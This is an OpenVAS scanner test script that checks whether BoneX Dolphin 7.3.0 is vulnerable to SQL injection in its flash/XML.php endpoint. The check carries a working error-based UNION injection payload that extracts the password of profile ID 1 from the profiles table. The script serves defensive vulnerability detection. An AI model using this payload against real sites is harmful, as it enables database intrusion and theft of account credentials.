###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dolphin_flash_module_sql_inj_vuln.nasl 12051 2018-10-24 09:14:54Z asteins $
#
# Dolphin flash Modules SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:boonex:dolphin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807369");
  script_version("$Revision: 12051 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 11:14:54 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-09-27 12:16:59 +0530 (Tue, 27 Sep 2016)");
  script_tag(name:"qod_type", value:"remote_active");
  script_name("Dolphin flash Modules SQL Injection Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Dolphin and
  is prone to SQL injection vulnerability .");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute SQL query or not.");

  script_tag(name:"insight", value:"The flaw exists due to an insufficient
  validation of user supplied input via 'user id' parameter to 'XML.php'
  script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Dolphin versions 7.3.0");

  script_tag(name:"solution", value:"Upgrade to version 7.3.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40403");
  script_xref(name:"URL", value:"http://security.szurek.pl/dolphin-730-error-based-sql-injection.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dolphin_detect.nasl");
  script_mandatory_keys("Dolphin/Installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.boonex.com");
  exit(0);
}


include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

if(dir == "/") dir = "";

url = dir +  "/flash/XML.php?module=chat&action=RayzSetMembershipSetting" +
      "&id=1&_t=41920&key=%27%20UNION%20select%201,%20exp(~(select*from(SE" +
      "LECT%20Password%20FROM%20profiles%20WHERE%20ID=1)x));%20--%20a";

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"Database access error. Description:",
                   extra_check:make_list("Error saving setting.", "failed",
                           " status=")))
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}
